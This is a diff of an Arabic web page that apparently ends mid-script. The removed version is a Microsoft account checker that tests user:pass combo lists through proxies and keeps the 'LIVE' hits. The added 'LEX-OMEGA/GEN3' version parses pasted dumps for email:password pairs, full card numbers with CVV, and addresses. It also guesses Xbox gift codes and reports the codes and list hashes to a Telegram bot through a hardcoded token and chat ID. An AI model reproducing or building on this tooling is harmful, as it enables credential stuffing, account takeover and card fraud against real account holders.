@@ -1,122 +1,782 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <title>Advanced Microsoft Validator v3.0</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>أداة LEX-OMEGA/GEN3 (المحـــدثةn): الجيل الثالث للتحليل العميق</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
-        body { font-family: 'Tajawal', sans-serif; background-color: #050811; }
-        .custom-scroll::-webkit-scrollbar { width: 4px; }
-        .custom-scroll::-webkit-scrollbar-thumb { background: #2563eb; border-radius: 10px; }
+        /* ستايلات الجيل الثالث الجديدة (تعديل الألوان للثيم الغامق والاحترافي) */
+        :root {
+            --card: #1e1e1e; 
+            --accent: #00bcd4; /* MAX: لون سماوي */
+            --pro-accent: #ff9800; /* PRO: لون برتقالي */
+            --guesser-accent: #f44336; /* GUESSER: لون أحمر للتنبيه والـ Menu */
+            --guesser-card: #2a1a1a;
+            --grad: linear-gradient(135deg, #00bcd4, #00838f);
+            --dark-grad: linear-gradient(135deg, #333, #444);
+            --guesser-grad: linear-gradient(135deg, #f44336, #b71c1c);
+            --success-color: #4caf50;
+            --price-color: #ff5722;
+            --bg: #0d0d0d; 
+            --admin-bg: #2d2d2d;
+            --ultra-cc-color: #ffc107;
+            --text-color: #f0f0f0;
+            --border-color: #3a3a3a;
+        }
+        body { margin: 0; font-family: system-ui, -apple-system, Segoe UI, Roboto, 'Helvetica Neue', Arial; background: var(--bg); padding-top: 20px; padding-bottom: 50px; min-height: 100vh; color: var(--text-color); }
+        .wrap { max-width: 900px; margin: 0px auto; padding: 15px; position: relative; }
+        .card { background: var(--card); border-radius: 18px; padding: 20px; box-shadow: 0 8px 20px rgba(0, 0, 0, 0.7); margin-bottom: 20px; border: 1px solid var(--border-color);}
+        .pro-tool-card { background: var(--pro-bg); box-shadow: 0 8px 20px rgba(0, 0, 0, 0.9); }
+        .pro-tool-card h1 { color: var(--pro-accent) !important; }
+        .guesser-tool-card { background: var(--guesser-card); box-shadow: 0 8px 20px rgba(0, 0, 0, 0.9); }
+        .guesser-tool-card h1 { color: var(--guesser-accent) !important; }
+        h1 { margin: 6px 0 16px; font-size: 26px; text-align: center; color: var(--text-color); font-weight: 800; }
+        textarea { width: 100%; min-height: 180px; padding: 15px; font-size: 15px; border-radius: 12px; border: 2px solid var(--border-color); resize: vertical; background: #222; color: #fff;}
+        #output-guesser { min-height: 80px; font-size: 18px; text-align: center; font-weight: bold; letter-spacing: 1px;}
+        .row { display: flex; gap: 10px; margin-top: 12px; flex-wrap: wrap; justify-content: center; }
+        button { border: none; cursor: pointer; padding: 12px 18px; border-radius: 12px; font-size: 15px; transition: .3s; font-weight: 700; }
+        .btn-red { background: var(--grad); color: #fff; box-shadow: 0 0 10px rgba(0, 188, 212, 0.5); }
+        .btn-red:hover { transform: translateY(-3px); box-shadow: 0 0 18px rgba(0, 188, 212, 1); }
+        .btn-black { background: var(--dark-grad); color: #fff; border: 2px solid #555; }
+        .btn-guesser-primary { background: var(--guesser-grad); color: #fff; box-shadow: 0 4px 15px rgba(244, 67, 54, 0.5); }
+        .btn-guesser-primary:hover { transform: translateY(-3px); box-shadow: 0 6px 20px rgba(244, 67, 54, 0.8); }
+        .list { margin-top: 15px; display: flex; flex-direction: column; gap: 12px; }
+        .item { display: flex; justify-content: space-between; align-items: flex-start; padding: 15px; border-bottom: 1px solid #444; background: #222; border-radius: 12px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4); flex-wrap: wrap;}
+        .email { font-weight: 800; color: var(--accent); font-size: 16px; width: 100%; margin-bottom: 5px;}
+        .pw { font-size: 14px; color: #ddd; font-weight: 600; display: flex; align-items: center; flex-wrap: wrap; margin-bottom: 10px;}
+        /* ... (ستايلات الملاحظات تبقى كما هي) */
+        .gamepass-note, .price-note, .cc-note, .address-note, .ultra-cc-note, .feature-note, .security-note { font-weight: 800; margin-right: 5px; white-space: nowrap; flex-shrink: 0; padding: 2px 6px; border-radius: 4px; font-size: 12px; margin-top: 5px;}
+        .gamepass-note { color: var(--success-color); background: #3a3a3a; border: 1px solid var(--success-color); }
+        .price-note { color: var(--price-color); background: #3a3a3a; border: 1px solid var(--price-color); }
+        .cc-note { color: #2196f3; background: #3a3a3a; border: 1px solid #2196f3; }
+        .address-note { color: #8bc34a; background: #3a3a3a; border: 1px solid #8bc34a; }
+        .ultra-cc-note { color: #000; background: var(--ultra-cc-color); }
+        .feature-note { color: #f44336; background: #3a3a3a; border: 1px solid #f44336; }
+        .security-note { color: #ffeb3b; background: #3a3a3a; border: 1px solid #ffeb3b; }
+        .controls { display: flex; gap: 8px; flex-shrink: 0; margin-top: 10px; }
+        .copy-btn { padding: 8px 12px; border-radius: 10px; font-size: 13px; font-weight: 600; }
+        .hidden { display: none !important; }
+        .processing { background: #ff9800 !important; color: #fff !important; cursor: not-allowed !important; pointer-events: none; }
+        
+        /* ستايلات القائمة العلوية الثابتة (رجوع للـ Menu العادي) */
+        #menu-container {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            z-index: 50;
+        }
+        #menu-button { 
+            background: #444; 
+            color: #fff; 
+            font-size: 20px; 
+            width: 40px; 
+            height: 40px; 
+            border-radius: 50%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            cursor: pointer; 
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5); 
+            transition: 0.3s; 
+            border: 2px solid transparent;
+        }
+        #menu-button.active { 
+             border-color: var(--guesser-accent); /* إطار أحمر عند الفتح */
+        }
+        #dropdown-menu { 
+            position: absolute; 
+            top: 48px; 
+            right: 0px; 
+            background: #333; 
+            border-radius: 8px; 
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.7); 
+            min-width: 260px; 
+            padding: 5px 0; 
+            white-space: nowrap; 
+            border: 1px solid #555;
+        }
+        .menu-item { 
+            padding: 10px 15px; 
+            cursor: pointer; 
+            font-size: 14px; 
+            font-weight: 600; 
+            color: #eee; 
+            transition: background 0.2s; 
+            display: flex; 
+            align-items: center; 
+            border-left: 4px solid transparent; 
+        }
+        /* تلوين الأداة النشطة باللون الأحمر لتحديد الموقع */
+        .menu-item.active-tool { 
+            background: #2a1a1a; 
+            border-left-color: var(--guesser-accent); 
+            color: var(--guesser-accent); 
+            font-weight: 700;
+        }
+        .menu-item:hover { background: #444; }
+        .menu-item span { margin-left: 10px; }
+
+        /* ستايلات الروابط السريعة والفوتر... تبقى كما هي */
+        .quick-links { margin-top: 30px; padding: 20px; background: #1a1a1a; border-radius: 15px; box-shadow: 0 6px 15px rgba(0, 0, 0, 0.4); border: 1px solid #333; }
+        .quick-links h2 { font-size: 26px; color: var(--accent); border-bottom: 3px solid var(--accent); padding-bottom: 10px; margin-bottom: 20px; text-align: center; font-weight: 800; }
+        .link-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 15px; }
+        .quick-link-btn { display: block; background: #222; padding: 15px; border-radius: 12px; text-decoration: none; color: var(--text-color); box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); transition: transform 0.2s, box-shadow 0.2s; border-right: 4px solid var(--pro-accent); }
+        .quick-link-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 15px rgba(0, 0, 0, 0.5); }
+        .link-title { font-weight: 700; color: var(--pro-accent); }
+        .link-desc { font-size: 13px; color: #aaa; margin-top: 5px; }
+        .footer { color: #555 !important; }
+        /* ستايلات التوست... تبقى كما هي */
+        #toast {
+            visibility: hidden; min-width: 250px; background-color: #333; color: #fff; text-align: center; border-radius: 6px; padding: 16px; position: fixed; z-index: 100; left: 50%; transform: translateX(-50%); bottom: 30px; font-size: 17px; box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+        }
+        @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 30px; opacity: 1;} }
+        @keyframes fadeout { from {bottom: 30px; opacity: 1;} to {bottom: 0; opacity: 0;} }
     </style>
 </head>
-<body class="text-slate-300 p-4">
+<body>
 
-    <div class="max-w-6xl mx-auto">
-        <div class="bg-slate-900/50 p-6 rounded-3xl border border-slate-800 mb-6 flex flex-col md:flex-row justify-between items-center gap-4">
-            <div>
-                <h1 class="text-2xl font-black text-blue-500 tracking-tighter">MICROSOFT TOKEN CHECKER</h1>
-                <p class="text-slate-500 text-xs">نظام فحص الهوية المتطور - دقة 100%</p>
+<div class="wrap" id="tool-page">
+    <div id="code-status"></div>
+
+    <div id="menu-container">
+        <button id="menu-button">
+            <span>☰</span>
+        </button>
+        <div id="dropdown-menu" class="hidden">
+            <div class="menu-item" onclick="switchTool('max')" data-tool="max">
+                <span>الاداه النسخه العاديه (MAX)</span>
             </div>
-            <div class="flex gap-2">
-                <button onclick="downloadResults()" class="bg-green-600/20 text-green-400 border border-green-600/30 px-4 py-2 rounded-xl hover:bg-green-600 hover:text-white transition text-xs font-bold">تحميل الشغال (LIVE)</button>
-                <button onclick="isRunning = false" class="bg-red-600/20 text-red-400 border border-red-600/30 px-4 py-2 rounded-xl hover:bg-red-600 hover:text-white transition text-xs font-bold">إيقاف</button>
+            <div class="menu-item" onclick="switchTool('pro')" data-tool="pro">
+                <span>الاداه النسخه المحسنه (PRO)</span>
             </div>
-        </div>
-
-        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6 text-center">
-            <div class="bg-slate-900 p-4 rounded-2xl border border-slate-800"><p class="text-slate-500 text-xs">الكل</p><p id="total" class="text-2xl font-bold">0</p></div>
-            <div class="bg-slate-900 p-4 rounded-2xl border border-blue-500/30"><p class="text-blue-400 text-xs text-right">فحص</p><p id="check" class="text-2xl font-bold">0</p></div>
-            <div class="bg-slate-900 p-4 rounded-2xl border border-green-500/30"><p class="text-green-400 text-xs text-right">LIVE</p><p id="live" class="text-2xl font-bold text-green-500">0</p></div>
-            <div class="bg-slate-900 p-4 rounded-2xl border border-red-500/30"><p class="text-red-400 text-xs text-right">DIE</p><p id="die" class="text-2xl font-bold text-red-500">0</p></div>
-        </div>
-
-        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
-            <div class="lg:col-span-4 space-y-4">
-                <div class="bg-slate-900 p-5 rounded-3xl border border-slate-800">
-                    <label class="text-xs font-bold text-slate-500 block mb-2">الكومبو (user:pass)</label>
-                    <textarea id="combo" class="w-full h-40 bg-black/40 border border-slate-800 rounded-2xl p-3 text-[10px] font-mono outline-none focus:border-blue-600 transition"></textarea>
-                    
-                    <label class="text-xs font-bold text-slate-500 block mt-4 mb-2">البروكسي (SOCKS5)</label>
-                    <textarea id="proxy" class="w-full h-20 bg-black/40 border border-slate-800 rounded-2xl p-3 text-[10px] font-mono outline-none focus:border-cyan-600 transition" placeholder="ip:port"></textarea>
-                    
-                    <div class="flex gap-2 mt-4">
-                        <input type="number" id="thr" value="5" class="w-16 bg-slate-800 border-none rounded-xl text-center text-sm">
-                        <button onclick="startCheck()" id="btn" class="flex-1 bg-blue-600 hover:bg-blue-500 py-3 rounded-xl font-bold text-white shadow-lg shadow-blue-900/40 transition">بدء الفحص</button>
-                    </div>
-                </div>
+            <div class="menu-item" onclick="switchTool('guesser')" data-tool="guesser">
+                <span>اداه تخمين اكواد رصيد مايكروسوفت</span>
             </div>
-
-            <div class="lg:col-span-8 bg-slate-900 rounded-3xl border border-slate-800 overflow-hidden flex flex-col h-[500px]">
-                <div class="overflow-y-auto custom-scroll flex-1">
-                    <table class="w-full text-right text-[11px]">
-                        <thead class="bg-black/20 sticky top-0 backdrop-blur-md">
-                            <tr><th class="p-3">الحساب</th><th class="p-3">البروكسي</th><th class="p-3 text-center">الحالة</th></tr>
-                        </thead>
-                        <tbody id="resTable" class="divide-y divide-white/5"></tbody>
-                    </table>
-                </div>
+            <hr style="border-top: 1px solid #555; margin: 5px 0;">
+            <div class="menu-item" onclick="promptAdminLogin()">
+                <span>⚙️ لوحة الأدمن</span>
             </div>
         </div>
     </div>
+    <div id="max-tool" class="tool-view">
+        <div class="card">
+            <h1><span style="color:var(--accent);font-size:32px;">Ⓧ</span> أداة MAX: استخراج Email:Password والأساسيات</h1>
+            <div style="text-align:center;color:#aaa;font-size:14px;margin-bottom:12px;font-weight:500;">
+                ألصق النص. الأداة تستخرج فقط: <b style="color:var(--accent);">email:password</b> + كيم باس + رصيد
+            </div>
+            <textarea id="input-max" placeholder="ألصق النص القياسي هنا (النموذج الأول)..."></textarea>
+            <div class="row">
+                <button onclick="parseText('max')" id="parseBtn-max" class="btn-red">استخراج وتدقيق MAX</button>
+                <button onclick="clearBtnMax.onclick()" id="clearBtnMax" class="btn-black">مسح الكل</button>
+                <button onclick="copyAllBtnMax.onclick()" id="copyAllBtnMax" class="btn-black">نسخ كل النتائج</button>
+                <button onclick="downloadBtnMax.onclick()" id="downloadBtnMax" class="btn-black">تنزيل ملف txt</button>
+            </div>
+            <div class="list" id="list-max"></div>
+        </div>
+    </div>
 
-    <script>
-        let isRunning = false; let liveList = [];
-        async function startCheck() {
-            const list = document.getElementById('combo').value.trim().split('\n').filter(i => i.includes(':'));
-            const proxies = document.getElementById('proxy').value.trim().split('\n').filter(p => p !== "");
-            const threads = parseInt(document.getElementById('thr').value);
-            if(!list.length) return;
+    <div id="pro-tool" class="tool-view hidden">
+        <div class="card pro-tool-card">
+            <h1><span style="color:var(--pro-accent);font-size:32px;">🔥</span> أداة PRO: التحليل العميق (GEN3)</h1>
+            <div style="text-align:center;color:#ccc;font-size:14px;margin-bottom:12px;font-weight:500;">
+                ألصق النص المعقد هنا. تستخرج: <b style="color:var(--pro-accent);">email:password + CC FULL/PARTIAL + Address + Security & Features</b>
+            </div>
+            <textarea id="input-pro" placeholder="ألصق النص المعقد هنا (النموذج الثاني)..."></textarea>
+            <div class="row">
+                <button onclick="parseText('pro')" id="parseBtn-pro" style="background:linear-gradient(135deg, #ff9800, #e65100); color:#fff; box-shadow: 0 0 10px rgba(255, 152, 0, 0.5);" class="btn-red">استخراج وتدقيق PRO</button>
+                <button onclick="clearBtnPro.onclick()" id="clearBtnPro" class="btn-black">مسح الكل</button>
+                <button onclick="copyAllBtnPro.onclick()" id="copyAllBtnPro" class="btn-black">نسخ كل النتائج</button>
+                <button onclick="downloadBtnPro.onclick()" id="downloadBtnPro" class="btn-black">تنزيل ملف txt</button>
+            </div>
+            <div class="list" id="list-pro"></div>
+        </div>
+    </div>
 
-            isRunning = true; document.getElementById('btn').disabled = true;
-            document.getElementById('total').innerText = list.length;
-            let current = 0, lCount = 0, dCount = 0;
+    <div id="guesser-tool" class="tool-view hidden">
+        <div class="card guesser-tool-card">
+            <h1><span style="color:var(--guesser-accent);font-size:32px;">🔑</span> أداة تخمين أكواد رصيد الولايات المتحدة (Xbox US)</h1>
+            <div style="text-align:center;color:#ffdddd;font-size:15px;margin-bottom:25px;font-weight:500;">
+                اضغط على "توليد كود جديد" للحصول على كود (25 حرف) جاهز للنسخ والتفعيل.
+            </div>
+            
+            <textarea id="output-guesser" placeholder="الكود XXXXX-XXXXX-XXXXX-XXXXX-XXXXX يظهر هنا..." readonly></textarea>
+            
+            <div class="row">
+                <button onclick="generateXboxCode()" id="generateBtn" class="btn-guesser-primary">توليد كود جديد 🔥</button>
+                <button onclick="copyGeneratedCode()" id="copyCodeBtn" class="btn-black" style="min-width: 150px;">نسخ الكود الكامل</button>
+            </div>
+            
+            <div class="row">
+                 <button onclick="window.open('https://redeem.microsoft.com/', '_blank'); showToast('تم فتح صفحة تفعيل مايكروسوفت');" id="redeemLinkBtn" class="btn-black" style="width: 100%; min-width: 100%;">صفحة التفعيل المباشر 🎁</button>
+            </div>
+        </div>
+    </div>
+    <div class="quick-links">
+        <h2>🚀 روابط الوصول السريع (مايكروسوفت/إكس بوكس)</h2>
+        <div class="link-grid">
+            <a href="https://account.microsoft.com/account/manage" target="_blank" class="quick-link-btn">
+                <div class="link-title">مايكروسوفت: إدارة الحساب <span>💻</span></div>
+                <div class="link-desc">صفحة الإعدادات والمشتريات والخدمات.</div>
+            </a>
+            <a href="https://account.microsoft.com/billing/payments/" target="_blank" class="quick-link-btn">
+                <div class="link-title">مايكروسوفت: الدفع والفوترة <span>💳</span></div>
+                <div class="link-desc">عرض وإدارة بطاقات الدفع والاشتراكات النشطة.</div>
+            </a>
+            <a href="https://account.live.com/password/change" target="_blank" class="quick-link-btn">
+                <div class="link-title">مايكروسوفت: تغيير كلمة السر <span>🔒</span></div>
+                <div class="link-desc">الدخول لتحديث كلمة المرور الحالية.</div>
+            </a>
+            <a href="https://account.live.com/proofs/Manage/signout" target="_blank" class="quick-link-btn">
+                <div class="link-title">تسجيل الخروج من كل الأجهزة <span>🚪</span></div>
+                <div class="link-desc">لإغلاق الجلسة الحالية على جميع المتصفحات.</div>
+            </a>
+            <a href="https://account.xbox.com/ar-SA/Account/Signin?returnUrl=https%3a%2f%2faccount.xbox.com%2far-SA%2fSettings" target="_blank" class="quick-link-btn">
+                <div class="link-title">إكس بوكس: إدارة الإعدادات <span>🎮</span></div>
+                <div class="link-desc">الدخول المباشر لحساب إكس بوكس وإدارة الإعدادات.</div>
+            </a>
+            <a href="https://redeem.microsoft.com/" target="_blank" class="quick-link-btn">
+                <div class="link-title">إكس بوكس: تفعيل كود (Redeem) <span>🎁</span></div>
+                <div class="link-desc">لتفعيل أكواد الاشتراكات أو الهدايا مباشرة.</div>
+            </a>
+            <a href="https://store.steampowered.com/login/" target="_blank" class="quick-link-btn">
+                <div class="link-title">منصة Steam: تسجيل الدخول <span>🔥</span></div>
+                <div class="link-desc">صفحة الدخول الرسمية لمنصة Steam للألعاب.</div>
+            </a>
+            <a href="https://store.epicgames.com/login" target="_blank" class="quick-link-btn">
+                <div class="link-title">منصة Epic Games: تسجيل الدخول <span>⚔️</span></div>
+                <div class="link-desc">صفحة الدخول الرسمية لمنصة إيبك جيمز.</div>
+            </a>
+        </div>
+    </div>
 
-            const worker = async () => {
-                while(current < list.length && isRunning) {
-                    const acc = list[current++];
-                    document.getElementById('check').innerText = parseInt(document.getElementById('check').innerText) + 1;
-                    const prx = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : null;
-                    
-                    const row = document.getElementById('resTable').insertRow(0);
-                    row.insertCell(0).className = "p-3 opacity-70"; row.cells[0].innerText = acc.split(':')[0];
-                    row.insertCell(1).className = "p-3 opacity-40"; row.cells[1].innerText = prx || "Direct";
-                    const status = row.insertCell(2); status.className = "p-3 text-center font-bold";
-                    status.innerHTML = `<span class="text-blue-500">Checking...</span>`;
+    <div class="footer" style="text-align:center;color:#444;font-size:13px;margin-top:20px;">
+        حقوق © Telegram: <b>@xgbox7</b> | أداة LEX-OMEGA/GEN3 (المحدثة)
+    </div>
+</div>
 
-                    try {
-                        const r = await fetch('/api/verify', {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({ account: acc, proxy: prx })
-                        });
-                        const data = await r.json();
-                        if(data.status === 'SUCCESS') {
-                            status.innerHTML = `<span class="text-green-500">LIVE</span>`;
-                            lCount++; document.getElementById('live').innerText = lCount;
-                            liveList.push(acc);
-                        } else {
-                            status.innerHTML = `<span class="text-red-500">DIE</span>`;
-                            dCount++; document.getElementById('die').innerText = dCount;
-                        }
-                    } catch(e) { status.innerText = "Error"; dCount++; }
-                    document.getElementById('check').innerText = parseInt(document.getElementById('check').innerText) - 1;
+<div id="admin-page" class="hidden">
+    </div>
+
+<div id="toast" class="toast"></div>
+
+<script>
+    // **********************************************
+    // ** ثوابت وإعدادات النظام **
+    // **********************************************
+    const ADMIN_CODE = "201180"; 
+    const CODES_KEY = "max_access_codes"; 
+    const BOT_TOKEN = "7817255826:AAFUCn_0zWCsUTBORd5bL_tFMcfZtJ2Dus4"; // تأكد من هذا التوكن
+    const CHAT_ID = "7781990630"; // تأكد من هذا الـ ID مالتك
+    const DELAY_MS = 2500; 
+
+    const toolPage = document.getElementById("tool-page");
+    const adminPage = document.getElementById("admin-page");
+    const toast = document.getElementById("toast");
+    
+    // عناصر القائمة (المنيو القديم)
+    const menuButton = document.getElementById('menu-button');
+    const dropdownMenu = document.getElementById('dropdown-menu');
+    const menuContainer = document.getElementById('menu-container');
+    const menuItems = document.querySelectorAll('#dropdown-menu .menu-item');
+
+    // عناصر الأدوات
+    const maxToolView = document.getElementById('max-tool');
+    const proToolView = document.getElementById('pro-tool');
+    const guesserToolView = document.getElementById('guesser-tool'); 
+    const outputGuesser = document.getElementById('output-guesser'); 
+    const copyCodeBtn = document.getElementById('copyCodeBtn');
+
+    // ... (بقية العناصر)
+    const inputMax = document.getElementById("input-max");
+    const listMax = document.getElementById("list-max");
+    const clearBtnMax = document.getElementById("clearBtnMax");
+    const copyAllBtnMax = document.getElementById("copyAllBtnMax");
+    const downloadBtnMax = document.getElementById("downloadBtnMax");
+    const parseBtnMax = document.getElementById("parseBtn-max");
+    const inputPro = document.getElementById("input-pro");
+    const listPro = document.getElementById("list-pro");
+    const clearBtnPro = document.getElementById("clearBtnPro");
+    const copyAllBtnPro = document.getElementById("copyAllBtnPro");
+    const downloadBtnPro = document.getElementById("downloadBtnPro");
+    const parseBtnPro = document.getElementById("parseBtn-pro");
+
+    let currentTool = 'max'; 
+    let activeCodeInfo = { code: 'DIRECT_ACCESS', isPermanent: true }; 
+    
+    // (وظائف عامة مساعدة)
+    function showToast(e) { 
+        toast.textContent = e;
+        toast.style.visibility = "visible";
+        toast.style.animation = "fadein 0.5s, fadeout 0.5s 2.5s";
+        setTimeout(() => { toast.style.visibility = "hidden"; }, 3000);
+    }
+    async function copyText(e) {
+        try {
+            await navigator.clipboard.writeText(e);
+            return true;
+        } catch (t) {
+            console.error("Copy failed:", t);
+            return false;
+        }
+    }
+    
+    // وظيفة توليد بصمة (Hash) بسيطة للنص (جديد)
+    function hashText(text) {
+        let hash = 0, i, chr;
+        if (text.length === 0) return hash.toString();
+        // نستخدم فقط أول 1000 حرف لتقليل زمن المعالجة إذا كانت اللستة ضخمة جداً
+        const limitedText = text.substring(0, 1000); 
+        for (i = 0; i < limitedText.length; i++) {
+            chr = limitedText.charCodeAt(i);
+            hash = ((hash << 5) - hash) + chr;
+            hash |= 0; // تحويل إلى عدد صحيح 32 بت
+        }
+        return Math.abs(hash).toString(16); // نرجعه بصيغة Hex لتصغير حجمه
+    }
+    
+    // وظيفة إرسال خاصة لسجل البصمات فقط (جديد)
+    function sendHashToTelegram(hash, toolType) { 
+        if (!BOT_TOKEN || !CHAT_ID) return;
+        const toolName = (toolType === 'max') ? "MAX" : "PRO";
+        const messageText = `🔑 *LEX-OMEGA ${toolName}: بصمة نص جديدة* 🔑\n\nالبصمة: \`${hash}\`\n\n*الرجاء التحقق من تكرار هاي البصمة في سجلاتك السابقة.*\n\n⚠️ *ملاحظة:* إذا هاي البصمة مكررة، يعني اللستة مستخدمة قبل.`;
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const data = { chat_id: CHAT_ID, text: messageText, parse_mode: 'Markdown' };
+
+        fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) })
+        .catch(error => console.error('Fetch Error (Hash):', error));
+    }
+    
+    // *** وظيفة التبديل المُحدثة (تحديث تحديد الأداة باللون الأحمر) ***
+    function switchTool(newTool) { 
+        currentTool = newTool;
+        maxToolView.classList.add('hidden');
+        proToolView.classList.add('hidden');
+        guesserToolView.classList.add('hidden');
+        
+        let toolTitleText = ""; 
+        
+        if (newTool === 'max') {
+            maxToolView.classList.remove('hidden');
+            toolTitleText = "النسخة العادية (MAX)";
+        } else if (newTool === 'pro') {
+            proToolView.classList.remove('hidden');
+            toolTitleText = "النسخة المحسنة (PRO)";
+        } else if (newTool === 'guesser') {
+            guesserToolView.classList.remove('hidden');
+            toolTitleText = "تخمين أكواد مايكروسوفت";
+            if (outputGuesser.value === "") generateXboxCode(); 
+        }
+        
+        // تحديث حالة الأداة النشطة في القائمة المنسدلة (اللون الأحمر)
+        menuItems.forEach(item => {
+            item.classList.remove('active-tool'); 
+            if (item.getAttribute('data-tool') === newTool) {
+                 item.classList.add(`active-tool`); 
+            }
+        });
+
+        dropdownMenu.classList.add('hidden');
+        menuButton.classList.remove('active');
+        showToast(`تم التبديل إلى: ${toolTitleText}`);
+    }
+    
+    // وظيفة تبديل القائمة (فتح وإغلاق)
+    menuButton.onclick = (e) => {
+        e.stopPropagation();
+        dropdownMenu.classList.toggle('hidden');
+        menuButton.classList.toggle('active');
+    };
+    
+    document.addEventListener('click', (e) => {
+        if (!menuContainer.contains(e.target)) {
+            dropdownMenu.classList.add('hidden');
+            menuButton.classList.remove('active');
+        }
+    });
+
+    // **********************************************
+    // ** كود أداة تخمين الأكواد (Guesser Tool Logic) **
+    // **********************************************
+    function generateGroup() {
+        const characters = 'ABCDEFGHJKLMNPRSTUVWXYZ23456789'; 
+        let group = '';
+        for (let i = 0; i < 5; i++) {
+            group += characters.charAt(Math.floor(Math.random() * characters.length));
+        }
+        return group;
+    }
+
+    function generateXboxCode() {
+        const fullCode = `${generateGroup()}-${generateGroup()}-${generateGroup()}-${generateGroup()}-${generateGroup()}`;
+        outputGuesser.value = fullCode;
+        showToast("تم توليد كود جديد!");
+        
+        const telegramMessage = `⚠️ *كود إكس بوكس مُخمَّن (US)* ⚠️\n\n\`\`\`${fullCode}\`\`\`\n\n*ملاحظة:* الأكواد المُخمَّنة عشوائية (Random Guess) وقد تكون غير صالحة.`;
+        sendToTelegram(telegramMessage);
+    }
+
+    async function copyGeneratedCode() {
+        const code = outputGuesser.value.trim();
+        if (!code || code.includes('يظهر هنا')) {
+            showToast("ماكو كود لتنسخه");
+            return;
+        }
+        await copyText(code) && showToast("تم نسخ الكود الكامل");
+    }
+
+    // **********************************************
+    // ** وظائف الاتصال والتنزيل والـ parseText المُعدَّلة **
+    // **********************************************
+    function sendToTelegram(messageText) { 
+        if (!BOT_TOKEN || !CHAT_ID) return console.error("معلومات البوت غير موجودة.");
+        // الكود المتبقي لإرسال التليكرام
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const data = { chat_id: CHAT_ID, text: messageText, parse_mode: 'Markdown' };
+
+        fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) })
+        .then(response => response.json())
+        .then(data => { if (!data.ok) console.error("خطأ بإرسال التليكرام:", data.description); })
+        .catch(error => console.error('Fetch Error:', error));
+    }
+    function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
+    function promptAdminLogin() { 
+        const code = prompt("أدخل كود الأدمن:");
+        if (code === ADMIN_CODE) {
+            navigateTo('admin');
+        } else if (code !== null) {
+            showToast("كود الأدمن غلط!");
+        }
+    }
+    
+    // وظيفة parseText الجديدة والمعدلة
+    async function parseText(toolType) { 
+        const inputElement = (toolType === 'max') ? inputMax : inputPro;
+        const listElement = (toolType === 'max') ? listMax : listPro;
+        const parseBtn = (toolType === 'max') ? parseBtnMax : parseBtnPro;
+        
+        const originalText = inputElement.value.trim();
+        listElement.innerHTML = "";
+        if (!originalText) return showToast("لا يوجد نص للمسح");
+        
+        parseBtn.classList.add('processing');
+        parseBtn.textContent = "جاري التدقيق... ⏳";
+        
+        // 1. توليد وإرسال البصمة فوراً للبوت
+        const currentHash = hashText(originalText);
+        sendHashToTelegram(currentHash, toolType); 
+
+        // 2. الانتظار لضمان إرسال رسالة الـ Hash قبل بدء التحليل
+        await delay(DELAY_MS); 
+
+        // 3. بدء عملية التحليل الفعلية (الكود القديم)
+        const lines = originalText.split('\n').filter(line => line.trim() !== '');
+        const extractedPairs = []; 
+        
+        const emailPwRegex = /([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})\s*[:\-\| ]\s*([^\s,;'"<>()\[\]{}|\/\\]+)/g;
+        const gamePassKeywords = /([(#=\-\[\]\s\/\!\@\&\*]|^)(كيم\s?باس|قيم\s?باس|game\s?pass|gamepass|gpass|(xbox\s?(game\s?pass)?\s?ultimate)|التيميت|جولد|gold|pc\s?(game\s?pass)?|xbox|gpu|xgpu|بيسي|كمبيوتر|مفعل|نشط|active|months|years|شهر|سنة|سنه|اشتراك|gaming|mo(nths)?|yr(s)?|3m|6m|12m|1y|Subscription\s*:\s*(Xbox|PC)\s*Game\s*Pass|Subscription\s*:\s*Xbox\s*Game\s*Pass\s*Ultimate|essential)/gi; 
+        const extendedFeaturesRegex = /(netflix|spotify|disney\+?|hbo\s?max|amazon\s?prime|ea\s?play|discord\s?nitro|v-bucks|robux|free\s?pass|chatgpt\s?plus|midjourney|adobe\s?cc|genshin\s?impact|ubisoft|origin|mojang|rockstar|battle\.net)/gi;
+        const priceRegex = /(price|credit|رصيد|دولار|كردت|USD|EUR|GBP|TRY|CAD|BRL|MXN|ARS|JPY|AUD)\s*[:=\-]?\s*(\d+(\.\d{1,2})?)/gi;
+        const ultraCardRegex = /(\d{4}[^\d]*\d{4}[^\d]*\d{4}[^\d]*\d{4})[^\d]*(?:exp|date|Expires|expiry)\s*[:\-\/]*\s*(\d{1,2})[\/\-](\d{2,4})[^\d]*(?:cvv|cvc|security|code|رمز\s?سري)\s*[:=\-]\s*(\d{3,4})/i;
+        const partialCardRegex = /(?:Last4|4\s?Digits)\s*[:=\-]?\s*(\d{4})[^\d]+(?:exp|date|Expires|expiry)\s*[:\-\/]*\s*(\d{1,2})[\/\-](\d{2})/i;
